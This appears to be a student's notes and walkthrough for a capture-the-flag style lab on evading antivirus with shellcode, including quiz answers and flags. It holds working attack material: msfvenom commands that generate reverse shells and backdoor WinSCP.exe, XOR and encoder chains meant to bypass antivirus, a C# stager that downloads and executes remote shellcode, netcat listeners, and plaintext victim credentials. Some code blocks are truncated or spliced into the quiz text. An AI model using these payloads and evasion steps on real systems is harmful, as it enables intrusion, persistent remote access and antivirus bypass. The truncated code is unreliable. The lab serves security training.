## PE Structure

* Windows Executable format (or PE - Portable Executable) is a data structure for organizing executable code.

* In general, default structure of Windows binaries (EXE, DLL, etc.) has the same PE structure and works for both x86 & x64 CPU architecture.

* PE Structure overview:

  * PE Headers:

    * Metadata
    * Data pointers
    * Entry point
    * Section tables

  * Sections:

    * Code
    * Imports
    * Data

* Tools such as PE-Bear can be used to check the PE structure of the executable file.

```markdown
1. What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? - 530949

2. What is the Magic number value of the thm-intro2PE.exe file (in Hex)? - 5A4D

3. What is the Entry Point value of the thm-intro2PE.exe file? - 12E4

4. How many Sections does the thm-intro2PE.exe file have? - 7

5. What is the name of the extra section? - .flag

6. Check the content of the extra section. What is the flag? - THM{PE-N3w-s3ction!}
```

## Introduction to Shellcode

* Shellcode - crafted machine code that tells the vulnerable program to run functions and provide access to a system shell (or create reverse shell); it is usually written in Assembly.

* Once shellcode is injected into a process and executed by the program, it modifies the code flow to update registers & functions to execute malicious code.

* Given shellcode:

```asm
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah
```

```shell
nasm -f elf64 thm.asm
#compile asm file for 64-bit linux
#this generates .o (object) file containing object code
#it needs to be linked for working executable file

ld thm.o -o thm
#link object and obtain final executable

./thm
#prints output

objdump -d thm
#dumps .text section of compiled binary

#to extract hex value from above output
objcopy -j .text -O binary thm thm.text
#dumps .text section into new file thm.text in binary format

xxd -i thm.text
#convert binary to hex
#outputs binary file in C string
#this gives us formatted shellcode from asm
```

* Executing our shellcode and injecting it into a C program:

```c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}
```

```shell
gcc -g -Wall -z execstack thm.c -o thmx
#compile C code by disabling NX protection

./thmx
#prints expected output
```

```markdown
1. Modify your C program to execute the following shellcode. What is the flag? - THM{y0ur-1s7-5h311c0d3}
```

## Generate Shellcode

* Generate shellcode using public tools:

```shell
#metasploit

msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
#generates shellcode that runs calc.exe
#create c program containing shellcode

i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
#compile as exe

#as we have victim machine creds thm:Password321
#we can use smbclient to transfer file
smbclient -U thm '//10.10.127.22/Tools'

put calc-MSF.exe

exit
#we can check calc-MSF.exe in the Windows machine now
```

```c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"

"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

* Generate shellcode from EXE files:

```shell
#shellcode can also be stored in .bin files (raw format)
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
#generates .bin shellcode

xxd -i /tmp/example.bin
#gives same shellcode
```

## Staged Payloads

* Stageless payloads (_ after shell) - embeds the final shellcode directly into itself.

* Staged payloads (/ after shell) - use intermediary shellcodes that act as steps leading to execution of final shellcode; each intermediary shellcode is known as stager.

* The usual scenario involves a two-stage payload, where stage0 is a stub shellcode which connects back to attacker machine to download final shellcode. Once retrieved, stage0 stub will inject final shellcode in memory of payload's process & execute it.

* Stageless payloads are better for networks with heavy perimeter security; staged payloads are great for keeping minimum footprint.

* Given staged payload:

using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

  public static void Main()
  {
    string url = "https://10.10.127.22/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}

```markdown
1. Do staged payloads deliver the full content of our payload in a single package? - nay

2. Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? - nay

3. Is the stage0 of a staged payload in charge of downloading the final payload to be executed? - yea
```

## Introduction to Encoding and Encryption

* Encoding - changing data from original state to specific format depending on algorithm or encoding type.

* Encryption - converting plaintext into ciphertext.

```markdown
1. Is encoding shellcode only enough to evade Antivirus software? - nay

2. Do encoding techniques use a key to encode strings or files? - nay

3. Do encryption algorithms use a key to encrypt strings or files? - yea
```

## Shellcode Encoding and Encryption

* While Metasploit provides encoding & encryption features, due to its public nature, AV can detect the payload easily.

```shell
msfvenom --list encoders
#list all encoders

msfvenom --list encoders | grep excellent

msfvenom -a x86 --platform Windows LHOST=10.10.127.22 LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
#-e for encoder
#-i for iterations; this encodes the payload thrice

msfvenom --list encrypt
#list all encryption modules

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.127.22 LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

```shell
#creating custom payload

#first create simple reverse shell in csharp
msfvenom LHOST=10.10.127.22 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
#this generates shellcode to be encoded

#now we can use given program that encodes the shellcode
#first it encodes payload in XOR with custom key
#then encodes it in base64
#replace buf variable with generated shellcode

#we can move this program to victim machine as seen earlier

#on Powershell, we can compile and execute encoder
csc .\Encrypter.cs

.\Encrypter.exe
#this generates a key to be used in decoder program

#for encoder, we also need decoder program to decode shellcode before execution
#compile and execute decoder
csc .\EncStageless.cs

nc -lvp 443
#setup listener

.\EncStageless.exe
#execute payload
#this gives us reverse shell
```

## Packers

* Packer - software that takes a program as input and transform its structure but not functionality; this is to compress the program and make its reverse engineering tougher.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.127.22 LPORT=7478 -f csharp
#generate shellcode

#compile given program
csc .\UnEncStagelessPayload.exe

#now we can use given ConfuserEx packer on the payload
#as given in the task

nc -lvp 7478
#setting up listener before executing payload in given AV checker
#this gives us shell through av-victim
#for task 2
```

* Given payload program:

```cs
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

1. Will packers help you obfuscate your malicious code to bypass AV solutions? - yea

2. Will packers often unpack the original code in-memory before running it? - yea

3. Are some packers detected as malicious by some AV solutions? - yea
```

## Binders

* Binder - program that merges multiple executables into a single one; for hiding payloads into other programs.

```shell
#to generate a backdoored payload
#which will include shellcode inside legit app
#so that legit app works but also executes shellcode silently
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=10.10.127.22 lport=7779 -f exe -o WinSCP-evil.exe

nc -lvp 7779
#we will get reverse shell once evil app is executed
```

1. Will a binder help with bypassing AV solutions? - nay

2. Can a binder be used to make a payload appear as a legitimate executable? - yea
